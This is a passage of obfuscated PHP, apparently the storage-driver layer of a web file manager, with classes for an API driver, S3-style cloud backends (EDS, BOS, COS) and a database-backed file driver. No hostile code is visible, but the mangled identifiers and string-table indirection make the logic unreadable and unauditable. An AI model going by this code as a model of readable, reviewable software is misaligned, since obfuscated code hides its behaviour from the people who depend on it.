array($Ó’ò¢ï[1556] => $Ó’ò¢ï[1562], $Ó’ò¢ï[1557] => $Ó’ò¢ï[97], $Ó’ò¢ï[1559] => $Ó’ò¢ï[1563], $Ó’ò¢ï[1297] => array($Ó’ò¢ï[97] => $ÀÀ¿šõ”[0])), $Ó’ò¢ï[1564] => array($Ó’ò¢ï[1556] => $Ó’ò¢ï[1565], $Ó’ò¢ï[1557] => $Ó’ò¢ï[97], $Ó’ò¢ï[1559] => $Ó’ò¢ï[1566], $Ó’ò¢ï[1297] => array($Ó’ò¢ï[97] => $ÀÀ¿šõ”[0])), $Ó’ò¢ï[1511] => array($Ó’ò¢ï[1556] => $Ó’ò¢ï[1567], $Ó’ò¢ï[1557] => $Ó’ò¢ï[97], $Ó’ò¢ï[1568] => $Ó’ò¢ï[1569], $Ó’ò¢ï[1297] => array($Ó’ò¢ï[97] => $ÀÀ¿šõ”[0], $Ó’ò¢ï[179] => $ÀÀ¿šõ”[1])), $Ó’ò¢ï[1487] => array($Ó’ò¢ï[1556] => $Ó’ò¢ï[1487], $Ó’ò¢ï[1557] => $Ó’ò¢ï[97], $Ó’ò¢ï[1568] => $Ó’ò¢ï[600], $Ó’ò¢ï[1297] => array($Ó’ò¢ï[97] => $ÀÀ¿šõ”[0], $Ó’ò¢ï[179] => $ÀÀ¿šõ”[1], $Ó’ò¢ï[1525] => $ÀÀ¿šõ”[2])), $Ó’ò¢ï[1488] => array($Ó’ò¢ï[1556] => $Ó’ò¢ï[1488], $Ó’ò¢ï[1557] => $Ó’ò¢ï[97], $Ó’ò¢ï[1568] => $Ó’ò¢ï[600], $Ó’ò¢ï[1297] => array($Ó’ò¢ï[97] => $ÀÀ¿šõ”[0], $Ó’ò¢ï[1525] => $ÀÀ¿šõ”[2])), $Ó’ò¢ï[646] => array($Ó’ò¢ï[1556] => $Ó’ò¢ï[1570], $Ó’ò¢ï[1557] => $Ó’ò¢ï[1571], $Ó’ò¢ï[1568] => $Ó’ò¢ï[1572], $Ó’ò¢ï[1297] => array($Ó’ò¢ï[1560] => array(array($Ó’ò¢ï[97] => $ÀÀ¿šõ”[0])), $Ó’ò¢ï[97] => $ÀÀ¿šõ”[1], $Ó’ò¢ï[1525] => $ÀÀ¿šõ”[2])), $Ó’ò¢ï[648] => array($Ó’ò¢ï[1556] => $Ó’ò¢ï[1573], $Ó’ò¢ï[1557] => $Ó’ò¢ï[1571], $Ó’ò¢ï[1568] => $Ó’ò¢ï[1572], $Ó’ò¢ï[1297] => array($Ó’ò¢ï[1560] => array(array($Ó’ò¢ï[97] => $ÀÀ¿šõ”[0])), $Ó’ò¢ï[97] => $ÀÀ¿šõ”[1], $Ó’ò¢ï[1525] => $ÀÀ¿šõ”[2])), $Ó’ò¢ï[1275] => array($Ó’ò¢ï[1556] => $Ó’ò¢ï[1574], $Ó’ò¢ï[1557] => $Ó’ò¢ï[1558], $Ó’ò¢ï[1559] => $Ó’ò¢ï[97], $Ó’ò¢ï[1297] => array($Ó’ò¢ï[1560] => array(array($Ó’ò¢ï[97] => $ÀÀ¿šõ”[0])))), $Ó’ò¢ï[1491] => array($Ó’ò¢ï[1556] => $Ó’ò¢ï[1575], $Ó’ò¢ï[1557] => $Ó’ò¢ï[97], $Ó’ò¢ï[1568] => $Ó’ò¢ï[600], $Ó’ò¢ï[1297] => array($Ó’ò¢ï[97] => $ÀÀ¿šõ”[0], $Ó’ò¢ï[1576] => $ÀÀ¿šõ”[1])), $Ó’ò¢ï[118] => array($Ó’ò¢ï[1556] => $Ó’ò¢ï[1515], $Ó’ò¢ï[1557] => $Ó’ò¢ï[97], $Ó’ò¢ï[1568] => $Ó’ò¢ï[600], $Ó’ò¢ï[1297] => array($Ó’ò¢ï[97] => get_path_father($ÀÀ¿šõ”[0]), $Ó’ò¢ï[241] => $ÀÀ¿šõ”[1] ? $Ó’ò¢ï[1340] . $ÀÀ¿šõ”[1] : $Ó’ò¢ï[12], $Ó’ò¢ï[42] => get_path_this($ÀÀ¿šõ”[0]), $Ó’ò¢ï[1525] => $ÀÀ¿šõ”[2]))); $Š¹ÎµìË = $È÷ş¤¹¯[$˜å¡¤ûè]; if (!$Š¹ÎµìË) { return !1; } $â—¾çÔî = $Š¹ÎµìË[$Ó’ò¢ï[1297]]; $¡ÓË¢¹É = explode($Ó’ò¢ï[60], $Š¹ÎµìË[$Ó’ò¢ï[1557]]); foreach ($¡ÓË¢¹É as $º…²„†³) { $ë†³»‚ = $this->pathApiEncode(_get($â—¾çÔî, $º…²„†³)); array_set_value($â—¾çÔî, $º…²„†³, $ë†³»‚); } if ($˜å¡¤ûè == $Ó’ò¢ï[1491] && trim($Š¹ÎµìË[$Ó’ò¢ï[1297]][$Ó’ò¢ï[97]], $Ó’ò¢ï[8]) == trim($this->_config[$Ó’ò¢ï[1298]], $Ó’ò¢ï[8])) { return $Š¹ÎµìË[$Ó’ò¢ï[1297]][$Ó’ò¢ï[97]]; } $Î¬âúĞß = $this->requestSend($Š¹ÎµìË[$Ó’ò¢ï[1556]], $â—¾çÔî); if (!$Î¬âúĞß) { return !1; } $øÖÃ†²¹ = $Î¬âúĞß[$Ó’ò¢ï[1334]]; if ($Š¹ÎµìË[$Ó’ò¢ï[1568]]) { $øÖÃ†²¹ = _get($Î¬âúĞß, $Š¹ÎµìË[$Ó’ò¢ï[1568]]); } if (is_string($øÖÃ†²¹) && !$Š¹ÎµìË[$Ó’ò¢ï[1559]]) { return $this->pathApiDecode($øÖÃ†²¹); } if (!is_array($øÖÃ†²¹) || !$øÖÃ†²¹) { return $øÖÃ†²¹; } $·—‹Ó‚ı = explode($Ó’ò¢ï[60], $Š¹ÎµìË[$Ó’ò¢ï[1559]]); foreach ($·—‹Ó‚ı as $º…²„†³) { $¡æàÖ©İ = explode($Ó’ò¢ï[10], $º…²„†³); $ø¼¤¯Ô = array_search($Ó’ò¢ï[1577], $¡æàÖ©İ); if ($ø¼¤¯Ô === !1) { $ë†³»‚ = $this->pathApiDecode(_get($øÖÃ†²¹, $º…²„†³)); array_set_value($øÖÃ†²¹, $º…²„†³, $ë†³»‚); if ($˜å¡¤ûè == $Ó’ò¢ï[1548] && $º…²„†³ == $Ó’ò¢ï[97]) { $this->pathInfoParse($øÖÃ†²¹); } if ($˜å¡¤ûè == $Ó’ò¢ï[1510] && $º…²„†³ == $Ó’ò¢ï[1578]) { $this->pathInfoParse($øÖÃ†²¹[$Ó’ò¢ï[1485]]); } if ($˜å¡¤ûè == $Ó’ò¢ï[1510]) { $øÖÃ†²¹[$Ó’ò¢ï[1579]] = array(); } continue; } $âëšéù’ = implode($Ó’ò¢ï[10], array_slice($¡æàÖ©İ, $ø¼¤¯Ô + 1)); $ºÖØ½• = array(); if ($ø¼¤¯Ô === 0) { $ºÖØ½• =& $øÖÃ†²¹; } if ($ø¼¤¯Ô === 1) { $ºÖØ½• =& $øÖÃ†²¹[$¡æàÖ©İ[0]]; } if ($ø¼¤¯Ô === 2) { $ºÖØ½• =& $øÖÃ†²¹[$¡æàÖ©İ[0]][$¡æàÖ©İ[1]]; } foreach ($ºÖØ½• as $º…²„†³ => $¨ÑÛ¿Šı) { $ë†³»‚ = $this->pathApiDecode(_get($¨ÑÛ¿Šı, $âëšéù’)); array_set_value($ºÖØ½•[$º…²„†³], $âëšéù’, $ë†³»‚); $this->pathInfoParse($ºÖØ½•[$º…²„†³]); } unset($ºÖØ½•); } return $øÖÃ†²¹; } private function requestMakeUrl($è¸Èœ°Ù, $åà™“‘ø = '') { $–‹Ñ°ú =& $_SERVER[ŒÅŸ‹ä†]; $‘’Ğ ÏŞ = $this->_config; if (!$this->authToken) { return !1; } $ö†ÉÓ‡¯ = $this->requestQuery($åà™“‘ø, !0) . $–‹Ñ°ú[1580] . $this->authToken; $ï£œ÷ = rtrim($‘’Ğ ÏŞ[$–‹Ñ°ú[585]][$–‹Ñ°ú[1527]], $–‹Ñ°ú[8]) . $–‹Ñ°ú[1581] . $è¸Èœ°Ù; return $ï£œ÷ . $–‹Ñ°ú[1582] . rawurlencode($‘’Ğ ÏŞ[$–‹Ñ°ú[585]][$–‹Ñ°ú[1499]]) . $ö†ÉÓ‡¯; } private function requestAuthToken() { $½õì„¡ª =& $_SERVER[ŒÅŸ‹ä†]; $˜–‘¾ªŞ = $this->_config; if (!$˜–‘¾ªŞ) { return !1; } $°‚ Ü›– = _get($˜–‘¾ªŞ, $½õì„¡ª[1583]); $ß¹ó‚¦ = array_find_by_field($˜–‘¾ªŞ[$½õì„¡ª[585]][$½õì„¡ª[1539]], $½õì„¡ª[1584], $°‚ Ü›–); if (!$ß¹ó‚¦) { return !1; } $­àê¬Œë = $ß¹ó‚¦[$½õì„¡ª[1585]] . $½õì„¡ª[1586] . $ß¹ó‚¦[$½õì„¡ª[1288]]; $ÖÚÄÓºú = $½õì„¡ª[1587] . $this->pathParse[$½õì„¡ª[492]] . $½õì„¡ª[482] . $­àê¬Œë; $ßûÉ„÷§ = Cache::get($ÖÚÄÓºú); if ($ßûÉ„÷§) { return $ßûÉ„÷§; } $ßûÉ„÷§ = Mcrypt::encode($­àê¬Œë, $½õì„¡ª[1588]); Cache::set($ÖÚÄÓºú, $ßûÉ„÷§, 3600 * 24 * 60); return $ßûÉ„÷§; } private function requestQuery($¹ïîİƒ© = '', $Êº…‡Ä = false) { if (!$¹ïîİƒ© || !is_array($¹ïîİƒ©)) { return $¹ïîİƒ©; } foreach ($¹ïîİƒ© as $¼›Ò¶ú˜ => $ —íÇ°ø) { if (is_array($ —íÇ°ø)) { $¹ïîİƒ©[$¼›Ò¶ú˜] = json_encode($ —íÇ°ø); } } return $Êº…‡Ä ? $_SERVER[ŒÅŸ‹ä†][295] . http_build_query($¹ïîİƒ©) : $¹ïîİƒ©; } private function requestSend($ŠË‰ë, $„Îó´) { $àçöóˆÌ =& $_SERVER[ŒÅŸ‹ä†]; $¹ëĞí § = $this->requestMakeUrl($ŠË‰ë); if (!$¹ëĞí §) { return !1; } $Üé¼±•§ = url_request($¹ëĞí §, $àçöóˆÌ[298], $this->requestQuery($„Îó´), !1, !1, !0); $ ½–Íï‘ = $Üé¼±•§[$àçöóˆÌ[1334]]; if (!is_array($ ½–Íï‘) || !$ ½–Íï‘ || !$ ½–Íï‘[$àçöóˆÌ[1344]] || intval($ ½–Íï‘[$àçöóˆÌ[1344]]) > 500) { $”ô®šŒâ = is_array($ ½–Íï‘) ? $ ½–Íï‘[$àçöóˆÌ[1334]] : $ ½–Íï‘ . $àçöóˆÌ[12]; if (!$Üé¼±•§[$àçöóˆÌ[846]]) { $”ô®šŒâ .= $àçöóˆÌ[1589] . $Üé¼±•§[$àçöóˆÌ[1344]] . $àçöóˆÌ[186]; } IO::errorTips($”ô®šŒâ, !1); return !1; } return $ ½–Íï‘; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ö°Ò€Æ½) { parent::__construct($ö°Ò€Æ½); $this->setSignVersion($_SERVER[ŒÅŸ‹ä†][258]); } } goto B±Ûé’³„œ; a’†ñ¼¤ğğ: class PathDriverBOS extends PathDriverS3 { public function __construct($€š£ˆ×) { parent::__construct($€š£ˆ×); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($åÍ‡¦à¦) { parent::__construct($åÍ‡¦à¦); $this->setSignVersion($_SERVER[ŒÅŸ‹ä†][258]); } public function uploadFormData($†£ú–«Ì, $Ë—«’ç = 3600) { $àèÔà® =& $_SERVER[ŒÅŸ‹ä†]; $ÜâêêŞà = $àèÔà®[240]; $Ÿ¾»ëº = $àèÔà®[1468]; $ØÚ­†Ùö = $àèÔà®[272]; $ø¿¥äÏº = gmdate($àèÔà®[1469], time() + $Ë—«’ç); $úöº„Î = (string) time() . $àèÔà®[84] . (string) (time() + $Ë—«’ç); $ç¾ùŞ¹ = array($àèÔà®[273] => $ø¿¥äÏº, $àèÔà®[276] => array(array($àèÔà®[316] => $ÜâêêŞà), array($àèÔà®[277] => $this->bucket), array($àèÔà®[278], $àèÔà®[279], $àèÔà®[12]), array($àèÔà®[281] => $ØÚ­†Ùö), array($àèÔà®[1470] => $Ÿ¾»ëº), array($àèÔà®[1471] => $this->accessKey), array($àèÔà®[1472] => $úöº„Î))); $ç¾ùŞ¹ = json_encode($ç¾ùŞ¹); $Ï×¨ì·Ì = hash_hmac($àèÔà®[1468], $úöº„Î, $this->secret); $ö»•ê¬§ = sha1($ç¾ùŞ¹); $”ÄáîÛÖ = hash_hmac($àèÔà®[1468], $ö»•ê¬§, $Ï×¨ì·Ì); $êŠ„› ƒ = array($àèÔà®[316] => $ÜâêêŞà, $àèÔà®[281] => $ØÚ­†Ùö, $àèÔà®[288] => base64_encode($ç¾ùŞ¹), $àèÔà®[1470] => $Ÿ¾»ëº, $àèÔà®[1471] => $this->accessKey, $àèÔà®[1473] => $úöº„Î, $àèÔà®[1474] => $”ÄáîÛÖ, $àèÔà®[217] => $this->getHost()); return $êŠ„› ƒ; } public function fileOutImage($ÈÔúÕµ®, $×¾ê÷ğ¥ = 250) { $â„‘ºÓÛ =& $_SERVER[ŒÅŸ‹ä†]; if ($this->size($ÈÔúÕµ®) > 1024 * 1024 * 32) { return $this->fileOutImageServer($ÈÔúÕµ®, $×¾ê÷ğ¥); } $†æĞÍá™ = $this->link($ÈÔúÕµ®); $†æĞÍá™ .= $â„‘ºÓÛ[1475] . $×¾ê÷ğ¥ . $â„‘ºÓÛ[1476]; $this->fileOutLink($†æĞÍá™); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ø˜÷ ÷Û) { $this->pathParse = $Ø˜÷ ÷Û; $this->model = Model($_SERVER[ŒÅŸ‹ä†][1477]); } public function getPath($şÙàÕöô) { return trim($şÙàÕöô, $_SERVER[ŒÅŸ‹ä†][8]); } public function pathFather($ú¾Â«™Ä) { $ÂŞ¼Ï“‹ = $this->parse($ú¾Â«™Ä); $ÂŞ¼Ï“‹ = $this->infoSimple($ú¾Â«™Ä); return $ÂŞ¼Ï“‹ ? $ÂŞ¼Ï“‹[$_SERVER[ŒÅŸ‹ä†][201]] : !1; } public function pathThis($Ñœã»Æá) { $ÆÀ²êÄ = $this->infoSimple($Ñœã»Æá); return $ÆÀ²êÄ ? $ÆÀ²êÄ[$_SERVER[ŒÅŸ‹ä†][42]] : !1; } public function getPathOuter($ÊŒ¼œã) { if (!$ÊŒ¼œã) { return $ÊŒ¼œã; } $ÒÓ¡æ÷Î = $this->parse($ÊŒ¼œã); return KodIO::make($ÒÓ¡æ÷Î[$_SERVER[ŒÅŸ‹ä†][492]]); } public function copyFolderFromIO($‰±Ì¬Œ, $Šö²Ò€, $Ñö¡³Ÿ½, $êºóĞÈŸ, $ÌÂÌğİ‚) { $“ÚÕ¦ê = $this->model->copyFolderFromIO($‰±Ì¬Œ, $Šö²Ò€, $Ñö¡³Ÿ½, $êºóĞÈŸ, $ÌÂÌğİ‚); return KodIO::make($“ÚÕ¦ê); } public function isParentOf($ªŞÉ½©‰, $ù€ÒÇô) { return $this->model->isParentOf($ªŞÉ½©‰, $ù€ÒÇô); } public function mkfile($«ù «ô¹, $˜ÎÂèœ° = '', $·Åäáç = REPEAT_RENAME) { $×Â£©â =& $_SERVER[ŒÅŸ‹ä†]; $üÒâ¢ğ = $this->parse($«ù «ô¹); $«ù «ô¹ = $üÒâ¢ğ[$×Â£©â[492]]; for ($¾ö·ºúë = 0; $¾ö·ºúë < count($üÒâ¢ğ[$×Â£©â[1478]]); $¾ö·ºúë++) { $üÌ—´†‹ = $üÒâ¢ğ[$×Â£©â[1478]][$¾ö·ºúë]; if ($¾ö·ºúë == count($üÒâ¢ğ[$×Â£©â[1478]]) - 1) { $«ù «ô¹ = $this->model->mkfile($«ù «ô¹, $üÌ—´†‹, $˜ÎÂèœ°, $·Åäáç); break; } $«ù «ô¹ = $this->model->mkdir($«ù «ô¹, $üÌ—´†‹, REPEAT_SKIP); } return $this->getPathOuter($«ù «ô¹); } public function mkdir($µ½‘û¤, $±½ëôÎ´ = REPEAT_SKIP) { $Úå¿÷òõ =& $_SERVER[ŒÅŸ‹ä†]; $Ÿ†×é­¬ = $this->parse($µ½‘û¤); $µ½‘û¤ = $Ÿ†×é­¬[$Úå¿÷òõ[492]]; for ($…ÅÑ²ƒÁ = 0; $…ÅÑ²ƒÁ < count($Ÿ†×é­¬[$Úå¿÷òõ[1478]]); $…ÅÑ²ƒÁ++) { $³“æ”ß… = $Ÿ†×é­¬[$Úå¿÷òõ[1478]][$…ÅÑ²ƒÁ]; $µ½‘û¤ = $this->model->mkdir($µ½‘û¤, $³“æ”ß…, $±½ëôÎ´); } return $this->getPathOuter($µ½‘û¤); } public function copyFile($´Âı¹„Ò, $½ãœÅÃ¢, $‰ìíÊÈì = REPEAT_REPLACE) { $Â’Íôø¬ =& $_SERVER[ŒÅŸ‹ä†]; $ŒÏÜ¹Ùœ = $this->parse($½ãœÅÃ¢); $æÊ´Üâ = $this->model->copy($´Âı¹„Ò, $ŒÏÜ¹Ùœ[$Â’Íôø¬[492]], $‰ìíÊÈì, $ŒÏÜ¹Ùœ[$Â’Íôø¬[97]]); return $æÊ´Üâ ? $this->getPathOuter($æÊ´Üâ) : !1; } public function moveFile($“¤˜Ÿ—ò, $·îªÒ÷, $™½è  ¸ = REPEAT_REPLACE) { $ù¿â±½Õ =& $_SERVER[ŒÅŸ‹ä†]; $‹üª‡¨• = $this->parse($·îªÒ÷); $©îû§É¯ = $this->model->move($“¤˜Ÿ—ò, $‹üª‡¨•[$ù¿â±½Õ[492]], $™½è  ¸, $‹üª‡¨•[$ù¿â±½Õ[97]]); return $©îû§É¯ ? $this->getPathOuter($©îû§É¯) : !1; } public function copy($öÙ¥è”ã, $şåøø‹ş, $Åò—œÛ = REPEAT_REPLACE, $İÇÙøÅì = false) { $–Û°‹¹Ì = $this->parse($şåøø‹ş); $†»˜şÉÍ = $this->model->copy($öÙ¥è”ã, $–Û°‹¹Ì[$_SERVER[ŒÅŸ‹ä†][492]], $Åò—œÛ, $İÇÙøÅì); return $†»˜şÉÍ ? $this->getPathOuter($†»˜şÉÍ) : !1; } public function moveSameAllow() { } public function move($¬§ÊÅ¹¸, $Îó¹ÈäÇ, $ó¿˜—¥¨ = REPEAT_REPLACE, $€ŠÕÅ–ş = false) { $ÛïçÅ = $this->parse($Îó¹ÈäÇ); $½İ…³¨¶ = $this->model->move($¬§ÊÅ¹¸, $ÛïçÅ[$_SERVER[ŒÅŸ‹ä†][492]], $ó¿˜—¥¨, $€ŠÕÅ–ş); return $½İ…³¨¶ ? $this->getPathOuter($½İ…³¨¶) : !1; } public function remove($Öâò„, $É®ü›‚ = true) { return $this->model->remove($Öâò„, $É®ü›‚); } public function rename($‡·ƒË³£, $ÌâÏš¸÷) { $Œ¤Ì·Œ = $this->model->rename($‡·ƒË³£, $ÌâÏš¸÷); return $Œ¤Ì·Œ ? $this->getPathOuter($‡·ƒË³£) : $Œ¤Ì·Œ; } public function size($…ÑœÌëŠ) { $ò…×“Íó = $this->infoSimple($…ÑœÌëŠ); return $ò…×“Íó ? $ò…×“Íó[$_SERVER[ŒÅŸ‹ä†][89]] : 0; } public function infoSimple($•¡ŒËÕ) { return $this->model->sourceInfo($•¡ŒËÕ); } public function info($÷Øàƒ) { return $this->infoParse($÷Øàƒ); } public function infoAuth($íœ¡ÄïÁ) { return $this->infoParse($íœ¡ÄïÁ, !1, !0); } public function infoWithChildren($ã‘È¹ê•) { return $this->infoParse($ã‘È¹ê•, !0); } protected function infoParse($öÊÈ¤‘ì, $ÊÅÌ½£È = false, $á¯²’¤² = false) { if (!$ÊÅÌ½£È) { return $this->model->pathInfo($öÊÈ¤‘ì, $á¯²’¤²); } return $this->model->pathInfoMore($öÊÈ¤‘ì); } public function infoFullSimple($ ê¢ˆ‹ß) { $®‰ÇŸúš =& $_SERVER[ŒÅŸ‹ä†]; $Š¬ù¹ÕÁ = explode($®‰ÇŸúš[8], $ ê¢ˆ‹ß); $×®­ö®ë = implode($®‰ÇŸúš[8], array_splice($Š¬ù¹ÕÁ, 1)); return $this->model->pathInfoByPath($Š¬ù¹ÕÁ[0], $×®­ö®ë); } public function infoFull($³œš«µŠ) { $‡İáó¬¯ = $this->infoFullSimple($³œš«µŠ); return is_array($‡İáó¬¯) ? $this->model->pathInfo($‡İáó¬¯[$_SERVER[ŒÅŸ‹ä†][202]]) : !1; } public function hashSimple($£ —¿À©) { $»ô×ŸÉ» =& $_SERVER[ŒÅŸ‹ä†]; $¢Ê•¯ˆİ = $this->infoWithChildren($£ —¿À©); return $¢Ê•¯ˆİ[$»ô×ŸÉ»[178]][$»ô×ŸÉ»[700]]; } public function hashMd5($ÇĞöæŸ) { $Ê±Éğ¸á =& $_SERVER[ŒÅŸ‹ä†]; $ºŞ¤ƒë× = $this->infoWithChildren($ÇĞöæŸ); return $ºŞ¤ƒë×[$Ê±Éğ¸á[178]][$Ê±Éğ¸á[568]]; } public function exist($ÍéÑÚŠé) { $óùí­Îæ =& $_SERVER[ŒÅŸ‹ä†]; $ŞÖá¼ÈÊ = $this->parse($ÍéÑÚŠé); if (!$ŞÖá¼ÈÊ[$óùí­Îæ[97]]) { return $this->isFile($ÍéÑÚŠé) || $this->isFolder($ÍéÑÚŠé); } $¿±Ü°ÇÚ = array($óùí­Îæ[497] => $ŞÖá¼ÈÊ[$óùí­Îæ[492]], $óùí­Îæ[42] => $ŞÖá¼ÈÊ[$óùí­Îæ[97]]); $ô÷ï„‰ˆ = $this->model->where($¿±Ü°ÇÚ)->find(); return $ô÷ï„‰ˆ ? !0 : !1; } public function isFile($†É¼³’) { $‚ŞÚ²–Ö =& $_SERVER[ŒÅŸ‹ä†]; $Çì€’¯­ = $this->infoSimple($†É¼³’); return $Çì€’¯­ && $Çì€’¯­[$‚ŞÚ²–Ö[505]] == $‚ŞÚ²–Ö[239] ? !0 : !1; } public function isFolder($èíà…•‹) { $Ï·ÇàÅ =& $_SERVER[ŒÅŸ‹ä†]; $Ãôü·Ìá = $this->infoSimple($èíà…•‹); return $Ãôü·Ìá && $Ãôü·Ìá[$Ï·ÇàÅ[505]] == $Ï·ÇàÅ[101] ? !0 : !1; } public function listPath($›ˆìÕ¿ï, $›Øû¬†± = false) { $Ò›“şÚã =& $_SERVER[ŒÅŸ‹ä†]; if ($›ˆìÕ¿ï == $Ò›“şÚã[12]) { return !1; } $œ ½øªÆ = array($Ò›“şÚã[497] => $›ˆìÕ¿ï); if ($›Øû¬†±) { return $this->model->listSource($œ ½øªÆ, -1); } return $this->model->listSource($œ ½øªÆ); } public function has($ïğÇüëò, $èŞÚ…çÙ = false, $Å¥¤’Ëæ = null) { $›ŒÃÉ­ş =& $_SERVER[ŒÅŸ‹ä†]; $ÏÉÖ†ìø = $this->infoWithChildren($ïğÇüëò); if ($èŞÚ…çÙ) { return array($›ŒÃÉ­ş[251] => $ÏÉÖ†ìø[$›ŒÃÉ­ş[251]], $›ŒÃÉ­ş[250] => $ÏÉÖ†ìø[$›ŒÃÉ­ş[250]]); } return $Å¥¤’Ëæ ? $ÏÉÖ†ìø[$›ŒÃÉ­ş[251]] : $ÏÉÖ†ìø[$›ŒÃÉ­ş[250]]; } public function listAll($‰Û¿ø •) { $ö–Îìóå = IO::info($this->pathParse[$_SERVER[ŒÅŸ‹ä†][97]]); if (!$ö–Îìóå) { return array(); } return $this->model->listAll($‰Û¿ø •); } public function getContent($„‚ÃˆÌ) { return $this->model->getContent($„‚ÃˆÌ); } public function setContent($´â¤ë¼ä, $©¥ŞÀ = '') { return $this->model->setContent($´â¤ë¼ä, $©¥ŞÀ); } public function fileSubstr($Ÿäª®‰Ñ, $ÑÔÁ…´Ğ, $ÃÎ©ÙÂ£) { return $this->model->fileSubstr($Ÿäª®‰Ñ, $ÑÔÁ…´Ğ, $ÃÎ©ÙÂ£); } public function download($Œ‰æÙ¹Á, $ØÎ¢ïÜ = '') { $’Ÿ¯˜—œ = get_path_father($ØÎ¢ïÜ); $ÙÙÖÃÉ = get_path_this($ØÎ¢ïÜ); $İı¶½¸  = $this->model->fileInfoGet($Œ‰æÙ¹Á); $™·ô = IO::copy($İı¶½¸ [$_SERVER[ŒÅŸ‹ä†][97]], $’Ÿ¯˜—œ, !1, $ÙÙÖÃÉ); return $™·ô; } public function setModifyTime($è—†Ôş, $òÜ«íâê = '') { $Šˆ»Şñï =& $_SERVER[ŒÅŸ‹ä†]; if (!$è—†Ôş) { return; } $this->model->where(array($Šˆ»Şñï[511] => $è—†Ôş))->save(array($Šˆ»Şñï[98] => $òÜ«íâê)); } public function upload($ÁÁ¼§, $øŞìµÈ™, $ƒÖ‘áƒ = false, $©±Å…èŸ = REPEAT_REPLACE) { $Á‡÷÷ú© =& $_SERVER[ŒÅŸ‹ä†]; $´–³Ññê = $this->parse($ÁÁ¼§); $ğİ±ƒ = $this->model->addFile($´–³Ññê[$Á‡÷÷ú©[492]], $øŞìµÈ™, $´–³Ññê[$Á‡÷÷ú©[97]], $ƒÖ‘áƒ, $©±Å…èŸ); return $this->getPathOuter($ğİ±ƒ); } public function uploadFileByID($Ÿ³¯Ô…, $›¼Êœˆƒ, $Ş‡áŞé›) { $à¶Ü¢Õ˜ =& $_SERVER[ŒÅŸ‹ä†]; $†³Ò®ïÜ = $this->parse($Ÿ³¯Ô…); $º©Ê”Î¬ = $this->model->addFileByFileID($†³Ò®ïÜ[$à¶Ü¢Õ˜[492]], $›¼Êœˆƒ, $†³Ò®ïÜ[$à¶Ü¢Õ˜[97]], $Ş‡áŞé›); return $this->getPathOuter($º©Ê”Î¬); } public function addFileByRemote($õÌ³ÊÌš, $é¹ÏûãÍ, $—£ø×¬ = array(), $½¬­ÚÌ² = '', $ÆÛ¶Ù˜û) { $ÀÜØ€¬å =& $_SERVER[ŒÅŸ‹ä†]; $¶è·å®Ô = $this->parse($õÌ³ÊÌš); $½¬­ÚÌ² = empty($½¬­ÚÌ²) ? $¶è·å®Ô[$ÀÜØ€¬å[97]] : $½¬­ÚÌ²; $™—‡™” = $this->model->addFileByRemote($¶è·å®Ô[$ÀÜØ€¬å[492]], $é¹ÏûãÍ, $½¬­ÚÌ², $—£ø×¬, $ÆÛ¶Ù˜û); return $this->getPathOuter($™—‡™”); } public function uploadLink($ı–’¤‹Ù, $íàÙ¶¢ = 0) { $ÅŸ€Ï¯ =& $_SERVER[ŒÅŸ‹ä†]; $›®¾ë¹Í = $this->parse($ı–’¤‹Ù); $¤¸›§šù = _get($GLOBALS[$ÅŸ€Ï¯[7]], $ÅŸ€Ï¯[1479]); $ß®Ì¶Ş = _get($GLOBALS[$ÅŸ€Ï¯[7]], $ÅŸ€Ï¯[1480]); $¶Ä÷€ ‹ = KodIO::ioFileDriverGet($ÅŸ€Ï¯[503] . $›®¾ë¹Í[$ÅŸ€Ï¯[492]] . $ÅŸ€Ï¯[412]); $ï¡Î›¨Ê = Model($ÅŸ€Ï¯[702])->createFileName($›®¾ë¹Í[$ÅŸ€Ï¯[97]], $¶Ä÷€ ‹, $¤¸›§šù, $ß®Ì¶Ş); return IO::uploadLink($ï¡Î›¨Ê, $íàÙ¶¢); } public function fileNameAuto($ÁÂÚ²†Ë, $§õ£ŠÚ›, $–ˆºÓç¥ = REPEAT_REPLACE, $ÅÓ«ƒ²ƒ = false) { return $this->model->fileNameAuto($ÁÂÚ²†Ë, $§õ£ŠÚ›, $–ˆºÓç¥, $ÅÓ«ƒ²ƒ); } public function fileNameExist($ÜåÁÀË, $ş±ÈŒµÚ) { return $this->model->fileNameExist($ÜåÁÀË, $ş±ÈŒµÚ); } protected function _fileOut($·½ñ¬”, $§˜†ûÑï = false, $¡şåŞ²Š = false, $¾„ì‰çŠ = '', $í´ÔùÆ„ = false) { $Ñ—ÔÜÁ¿ =& $_SERVER[ŒÅŸ‹ä†]; $‹€ğôŠÛ = $this->model->sourceInfo($·½ñ¬”); if ($‹€ğôŠÛ[$Ñ—ÔÜÁ¿[505]] == $Ñ—ÔÜÁ¿[101]) { header($Ñ—ÔÜÁ¿[1481]); die; } $Ùñğ£ƒæ = $this->model->fileInfoGet($·½ñ¬”); $¾„ì‰çŠ = $Ùñğ£ƒæ[$Ñ—ÔÜÁ¿[568]] ? $Ùñğ£ƒæ[$Ñ—ÔÜÁ¿[568]] : $¾„ì‰çŠ; $è¥œ·÷¼ = isset($GLOBALS[$Ñ—ÔÜÁ¿[191]]) && is_array($GLOBALS[$Ñ—ÔÜÁ¿[191]]) ? $GLOBALS[$Ñ—ÔÜÁ¿[191]][$Ñ—ÔÜÁ¿[42]] : $‹€ğôŠÛ[$Ñ—ÔÜÁ¿[42]]; if ($í´ÔùÆ„) { return IO::fileOutServer($Ùñğ£ƒæ[$Ñ—ÔÜÁ¿[97]], $§˜†ûÑï, $è¥œ·÷¼, $¾„ì‰çŠ); } IO::fileOut($Ùñğ£ƒæ[$Ñ—ÔÜÁ¿[97]], $§˜†ûÑï, $è¥œ·÷¼, $¾„ì‰çŠ); } public function fileOut($°”ÖÀ‘â, $Å«‡áÍŸ = false, $¿³Öí£ş = false, $—ÉÇÛÃñ = '') { $this->_fileOut($°”ÖÀ‘â, $Å«‡áÍŸ, $¿³Öí£ş, $—ÉÇÛÃñ); } public function fileOutServer($ı©ÑÖùİ, $ƒ„©•ô± = false, $§®Í¹Èõ = false, $õİäªú³ = '') { $this->_fileOut($ı©ÑÖùİ, $ƒ„©•ô±, $§®Í¹Èõ, $õİäªú³, !0); } protected function _fileOutImage($ß²Ğ°çÌ, $§Æºú•Â = 250) { $öã‰À´” =& $_SERVER[ŒÅŸ‹ä†]; $„Ìì’ = $this->model->pathInfo($ß²Ğ°çÌ); if 